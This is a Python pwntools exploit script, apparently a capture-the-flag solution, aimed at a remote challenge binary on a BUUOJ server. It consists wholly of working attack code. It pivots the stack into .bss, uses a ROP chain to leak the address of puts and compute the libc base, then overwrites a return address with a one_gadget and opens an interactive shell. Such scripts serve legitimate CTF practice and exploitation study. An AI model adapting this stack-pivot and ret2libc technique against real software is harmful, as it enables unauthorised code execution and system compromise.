from pwn import *
#context.log_level="debug"

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27675)
elf=ELF("./timu")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

main=0x0000000000400626
bss=0x0000000000601080
leave_ret=0x0000000000400699
pop_rdi_ret=0x0000000000400703
onegadget_offset=0x4526a
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]

payload=0x60*b'a'+p64(bss+(0x8*20)-0x8)+p64(leave_ret)
sh.send(payload)
payload=p64(0)*20+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
sh.recvuntil(b"Done!You can check and use your borrow stack now!")
sh.sendline(payload)
sh.recv()
puts_addr=u64(sh.recv(6).ljust(8,b'\x00'))
libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
onegadget=libc_base+onegadget_offset

payload=0x68*b'a'+p64(onegadget)
sh.send(payload)
sh.interactive()
